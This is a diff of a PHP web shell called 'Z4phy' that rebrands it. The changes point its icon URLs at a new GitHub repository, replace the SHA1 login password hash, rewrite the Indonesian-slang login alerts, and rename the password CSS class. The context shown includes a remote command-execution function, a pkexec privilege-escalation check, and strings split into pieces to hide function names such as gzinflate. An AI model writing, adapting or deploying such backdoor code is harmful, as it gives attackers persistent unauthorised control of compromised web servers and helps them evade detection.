@@ -94,10 +94,10 @@ $whiteSemiParent2 = "rgba(255,255,255,0.2)";
 $whiteSemiParent3 = "rgba(255,255,255,0.3)";
 
 //icon config
-$filesIcon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x68\x61\x78\x6f\x72\x73\x74\x61\x72\x73\x2f\x61\x72\x63\x68\x69\x76\x65\x2f\x6d\x61\x69\x6e\x2f\x6d\x65\x64\x69\x61\x2f\x66\x69\x6c\x65\x73\x2e\x70\x6e\x67";
-$newFilesIcon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x68\x61\x78\x6f\x72\x73\x74\x61\x72\x73\x2f\x61\x72\x63\x68\x69\x76\x65\x2f\x6d\x61\x69\x6e\x2f\x6d\x65\x64\x69\x61\x2f\x6e\x65\x77\x2d\x66\x69\x6c\x65\x73\x2e\x70\x6e\x67";
-$folderIcon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x68\x61\x78\x6f\x72\x73\x74\x61\x72\x73\x2f\x61\x72\x63\x68\x69\x76\x65\x2f\x6d\x61\x69\x6e\x2f\x6d\x65\x64\x69\x61\x2f\x66\x6f\x6c\x64\x65\x72\x2e\x70\x6e\x67";
-$newFolderIcon = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x61\x77\x2e\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74\x2e\x63\x6f\x6d\x2f\x68\x61\x78\x6f\x72\x73\x74\x61\x72\x73\x2f\x61\x72\x63\x68\x69\x76\x65\x2f\x6d\x61\x69\x6e\x2f\x6d\x65\x64\x69\x61\x2f\x6e\x65\x77\x2d\x66\x6f\x6c\x64\x65\x72\x2e\x70\x6e\x67";
+$filesIcon = "https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/files.png";
+$newFilesIcon = "https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/new-files.png";
+$folderIcon = "https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/folder.png";
+$newFolderIcon = "https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/assets/new-folder.png";
 
 function Z4phyUname() {
     $hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
@@ -333,7 +333,7 @@ function Z4phyCmd($komendnya) {
         $output = $shell->Exec($kom_mand)->StdOut->ReadAll();
         return trim($hayoloh(stripslashes($output)));
     }else {
-        return "<b>The Function To Run The Command Is Disable On This Serever</b>";
+        return "<b> Yah Sorry Abangku Disable Function </b>";
     }
 }
 if (isset($_POST['z4phy'])) {
@@ -440,17 +440,15 @@ function cekPkexec() {
         echo "PKEXEC:&nbsp;&nbsp;$off";
     }
 }
-
-//login
-$passwd = 'ad'.'d9'.'51'.'3'.'f3'.'9'.'6a'.'c1'.'19'.'867'.'5b'.'06'.'122'.'bb'.'a94'.'3'.'eb9'.'e0'.'77'.'6';
+$goz4p = 'd8'.'73'.'5c'.'38'.'3d5'.'7a'.'ee'.'53'.'0'.'8e'.'67'.'93'.'c9e'.'0'.'e6'.'07'.'cd'.'f8'.'0e'.'11';
 $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
 if (isset($_POST['btn-login'])) {
-    if (SHA1($_POST['pass']) == $passwd) {
-        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Lo"."gi"."n "."Su"."cc"."es"."s!"." Yo"."u "."Pr"."o'".");"."</"."sc"."ri"."pt".">";
+    if (SHA1($_POST['pass']) == $goz4p) {
+        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Me"."ny"."al"."a "."Ab"."an"."gk"."u "."~!'".");"."</"."sc"."ri"."pt".">";
         $_SESSION["login"] = "login";
         setcookie('z4phyc0de', $my_self, time() + 3600 * 24);
     } else {
-        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Lo"."gi"."n F"."ai"."le"."d!"." Y"."ou "."Nu"."b')".";<"."/s"."cr"."ip"."t>";
+        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Go"." A"."wa"."y "."No"."ob"." !"."!')".";<"."/s"."cr"."ip"."t>";
     }
     function eNp($ZkzOl){
         $gflate = 'g'.'zi'.'nf'.'l'.'at'.'e';
@@ -551,7 +549,7 @@ if (empty($_SESSION['login'])) {
         padding: 5px;
     }
 
-    .terminal .passwd {
+    .terminal .goz4p {
         position: absolute;
         top: 20%;
         left: 2%;
@@ -560,7 +558,7 @@ if (empty($_SESSION['login'])) {
         color: #00ff00;
     }
 
-    .terminal .passwd input[type=text] {
+    .terminal .goz4p input[type=text] {
         background: transparent;
         border: none;
         outline: none;
@@ -569,7 +567,7 @@ if (empty($_SESSION['login'])) {
         color: #00ff00;
     }
 
-    .terminal .passwd input[type=text]:hover {
+    .terminal .goz4p input[type=text]:hover {
         border: none;
         outline: none;
     }
@@ -621,11 +619,11 @@ if (empty($_SESSION['login'])) {
             font-size: 15px;
         }
 
-        .terminal .passwd {
+        .terminal .goz4p {
             font-size: 15px;
         }
 
-        .terminal .passwd input[type=text] {
+        .terminal .goz4p input[type=text] {
             font-size: 15px;
         }
 
@@ -663,11 +661,11 @@ if (empty($_SESSION['login'])) {
             font-size: 20px;
         }
 
-        .terminal .passwd {
+        .terminal .goz4p {
             font-size: 20px;
         }
 
-        .terminal .passwd input[type=text] {
+        .terminal .goz4p input[type=text] {
             font-size: 20px;
         }
 
@@ -707,7 +705,7 @@ if (empty($_SESSION['login'])) {
             padding: 2px;
         }
 
-        .terminal .passwd {
+        .terminal .goz4p {
             position: absolute;
             top: 20%;
             left: 2%;
@@ -716,7 +714,7 @@ if (empty($_SESSION['login'])) {
             color: #00ff00;
         }
 
-        .terminal .passwd input[type=text] {
+        .terminal .goz4p input[type=text] {
             background: transparent;
             border: none;
             outline: none;
@@ -725,19 +723,19 @@ if (empty($_SESSION['login'])) {
             color: #00ff00;
         }
 
-        .terminal .passwd input[type=text]:hover {
+        .terminal .goz4p input[type=text]:hover {
             background: transparent;
             border: none;
             outline: none;
         }
 
-        .terminal .passwd input[type=text]:active {
+        .terminal .goz4p input[type=text]:active {
             background: transparent;
             border: none;
             outline: none;
         }
 
-        .terminal .passwd input[type=text]:focus {
+        .terminal .goz4p input[type=text]:focus {
             background: transparent;
             border: none;
             outline: none;
@@ -779,7 +777,7 @@ if (empty($_SESSION['login'])) {
         </div>
         <div class="root" style="color: #d00c0c"></div>
         <h1 id="app"></h1>
-        <div class="passwd">
+        <div class="goz4p">
             <form action="" method="post">
                 <label for="pass">Password</label>
                 <input type="text" id="pass" name="pass">
@@ -1161,7 +1159,7 @@ $path = str_replace("\\", "/", $path);
 <body>
     <header class="w-full flex flex-row">
         <div class="shell whitespace-nowrap py-2 px-2 flex flex-col">
-            <a href="?hidden&path=<?=$path?>/&z4phy&haxorstars" class="flex flex-row flex-nowrap"><img class="rounded rounded-xl" style="width: 5vh; height: 5vh;" src="<?=$s_he_ll_Logo?>" alt="LOGO"><h1 class="<?= $txtRed ?> mx-2 fs-super trade-winds"><?= $s_he_ll_Name ?></h1></a>
+            <a href="?hidden&path=<?=$path?>/&z4phy&ph4nt0mhive" class="flex flex-row flex-nowrap"><img class="rounded rounded-xl" style="width: 5vh; height: 5vh;" src="<?=$s_he_ll_Logo?>" alt="LOGO"><h1 class="<?= $txtRed ?> mx-2 fs-super trade-winds"><?= $s_he_ll_Name ?></h1></a>
             <span class="fs-xl poppins <?= $txtPurple ?>">KERNEL: <?= $kernel ?></span>
             <span class="fs-xl poppins <?= $txtPurple ?>">OS: <font class="ubuntu-mono <?= $txtGreen ?>"><?= $os ?>
                 </font>
